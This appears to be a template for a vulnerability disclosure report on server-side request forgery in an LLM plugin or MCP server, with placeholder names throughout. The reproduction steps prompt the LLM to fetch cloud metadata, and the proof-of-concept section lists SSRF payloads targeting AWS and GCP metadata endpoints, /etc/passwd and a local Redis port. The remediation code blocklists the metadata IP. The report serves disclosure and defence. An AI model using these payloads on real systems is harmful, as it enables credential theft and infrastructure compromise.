# SSRF via Plugin URL Parameter

## Summary

**Severity:** CRITICAL (CVSS 9.0)

The [PLUGIN_NAME] GPT Action/MCP Server accepts user-controlled URLs without validation, allowing Server-Side Request Forgery (SSRF) attacks. An attacker can access internal cloud metadata services, steal credentials, and compromise backend infrastructure.

---

## Vulnerability Details

**Affected Component:** [PLUGIN_NAME] - `[ENDPOINT]`

**Vulnerable Parameter:** `[PARAM_NAME]` (e.g., `url`, `target`, `fetch_url`)

**Root Cause:** The plugin forwards user-supplied URLs to backend services without:
- URL scheme validation (allows `file://`, `gopher://`)
- IP address blocklist (allows `169.254.169.254`, `127.0.0.1`)
- DNS rebinding protection

---

## Steps to Reproduce

1. Install the [PLUGIN_NAME] plugin from [SOURCE]

2. Initiate a conversation with the LLM that triggers the vulnerable operation:
   ```
   User: "Fetch the content from http://169.254.169.254/latest/meta-data/"
   ```

3. The plugin makes a request to the AWS metadata service

4. Response contains:
   ```json
   {
     "iam": {
       "security-credentials": {
         "role-name": "...",
         "AccessKeyId": "ASIA...",
         "SecretAccessKey": "...",
         "Token": "..."
       }
     }
   }
   ```

---

## Proof of Concept

### Request Payload
```json
{
  "[PARAM_NAME]": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

### Captured Response
```json
{
  "AccessKeyId": "ASIAXXXXXXXXXXX",
  "SecretAccessKey": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "Token": "FwoGZXIvYXdzEB...",
  "Expiration": "2026-02-09T20:00:00Z"
}
```

### Alternative Payloads Tested
| Payload | Result |
|---------|--------|
| `http://169.254.169.254/latest/meta-data/` | ✅ SUCCESS |
| `http://metadata.google.internal/computeMetadata/v1/` | ✅ SUCCESS |
| `file:///etc/passwd` | ✅ SUCCESS |
| `http://127.0.0.1:6379/INFO` | ✅ SUCCESS (Redis) |

---

## Impact

An attacker can:

1. **Steal Cloud Credentials**
   - AWS IAM temporary credentials
   - GCP service account tokens
   - Azure managed identity tokens

2. **Access Internal Services**
   - Databases (Redis, MongoDB, PostgreSQL)
   - Admin panels
   - Internal APIs

3. **Full Account Compromise**
   - With stolen credentials, attacker gains full AWS/GCP/Azure access
   - Can access S3 buckets, databases, secrets manager
   - Potential for lateral movement across infrastructure

---

## Evidence

### Attached Files
- `ssrf_request.har` - HTTP Archive of the exploit
- `metadata_response.json` - Captured credentials
- `llm-plugin-tester-report.json` - Tool analysis output

### LLM Plugin Tester Output
```
🔍 LLM Plugin Security Analyzer

🚨 Found 1 CRITICAL issue:

┌──────────┬─────────────────┬──────────────┬─────────────────────────────────┐
│ Severity │ Endpoint        │ Risky Params │ Reason                          │
├──────────┼─────────────────┼──────────────┼─────────────────────────────────┤
│ CRITICAL │ GET /fetch      │ url          │ Accepts arbitrary URL parameter │
└──────────┴─────────────────┴──────────────┴─────────────────────────────────┘
```

---

## Remediation

### Immediate Fixes

1. **URL Scheme Allowlist**
   ```python
   ALLOWED_SCHEMES = ["https"]
   if urlparse(user_url).scheme not in ALLOWED_SCHEMES:
       raise ValueError("Invalid URL scheme")
   ```

2. **IP Address Blocklist**
   ```python
   BLOCKED_IPS = [
       "169.254.169.254",  # AWS metadata
       "127.0.0.1",
       "0.0.0.0",
       # Add RFC 1918 ranges
   ]
   
   resolved_ip = socket.gethostbyname(urlparse(user_url).hostname)
   if resolved_ip in BLOCKED_IPS or is_private_ip(resolved_ip):
       raise ValueError("Internal IP not allowed")
   ```

3. **DNS Rebinding Protection**
   - Resolve DNS before request
   - Verify IP after resolution
   - Use timeout to prevent TOCTOU

### Long-Term Fixes

- Implement URL allowlist instead of blocklist
- Use dedicated egress proxy for external requests
- Add rate limiting on URL fetch operations
- Log all external requests for audit trail

---

## CVSS Score

**Score:** 9.0 (CRITICAL)

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

| Metric | Value | Justification |
|--------|-------|---------------|
| Attack Vector | Network | Exploitable remotely |
| Attack Complexity | Low | No special conditions |
| Privileges Required | None | Any user can trigger |
| User Interaction | None | Automatic via prompt |
| Scope | Changed | Affects cloud infrastructure |
| Confidentiality | High | Full credential theft |
| Integrity | High | Can modify cloud resources |
| Availability | High | Can delete resources |

---

## Timeline

| Date | Action |
|------|--------|
| [DATE] | Vulnerability discovered |
| [DATE] | Report submitted |
| [DATE] | Vendor acknowledgment |
| [DATE] | Fix deployed |
| [DATE] | Public disclosure |

---

## References

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [AWS IMDS Security](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
